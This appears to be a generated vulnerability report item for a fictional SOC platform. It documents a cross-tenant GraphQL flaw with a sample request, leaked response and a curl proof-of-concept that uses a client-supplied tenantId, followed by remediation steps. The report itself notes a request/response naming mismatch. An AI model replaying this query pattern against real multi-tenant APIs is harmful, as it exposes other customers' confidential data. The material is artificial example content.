# Security Analysis Report
**System:** ThreatLens SOC Platform
**Domain:** Cybersecurity / Security Operations Center
**Example ID:** GQL-0283
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Platform — Pattern 9.1 | GraphQL single endpoint vulnerability on `listResources` / `getResource` — attacker reads SOC threat records via single-endpoint exploitation |

---

## Finding 1 — Platform: GraphQL Single Endpoint Vulnerability (Pattern 9.1)

### Summary
The GraphQL API at `https://api.threatlens-soc-platf.example.com/graphql` uses a single endpoint for all operations. Per §5.0 Pattern 9.1, the single-endpoint design lacks per-operation authentication context — the `listResources` resolver accepts a client-supplied `tenantId` filter without JWT-level validation, enabling cross-tenant enumeration of SOC threat intelligence records.

**Context.txt inconsistency (documented):** The HAR request uses `listResources(tenantId: "tenant-d53c")`, while the HAR response returns data under the key `getResource`. These names conflict. Both are faithfully reproduced here.

**Note:** `x-request-id: req-e166d53c` is a server-assigned response header; it does not appear in the outgoing request.

**Pattern:** 9.1 — GraphQL: single endpoint vulnerabilities (Platform)
**Affected endpoint:** `POST https://api.threatlens-soc-platf.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.threatlens-soc-platf.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json

{"query":"query VulnerableOp { listResources(tenantId: \"tenant-d53c\") { resourceId ownerId data { sensitiveField } } }"}
```

**Response — Victim SOC Threat Record**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-d53c",
      "ownerId": "other-user-e166d53c",
      "data": {
        "sensitiveField": "CONFIDENTIAL-e166d53c",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

### Steps to Reproduce
```bash
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST "https://api.threatlens-soc-platf.example.com/graphql" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { listResources(tenantId: \"tenant-d53c\") { resourceId ownerId data { sensitiveField } } }"}'
# Vulnerable: tenantId: tenant-d53c, sensitiveField: CONFIDENTIAL-e166d53c
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. Resolver must inject `tenantId` from JWT — never accept client-supplied `tenantId` filter.
2. Implement per-operation auth middleware on the single GraphQL endpoint.
3. Redis cache key must include tenant dimension.
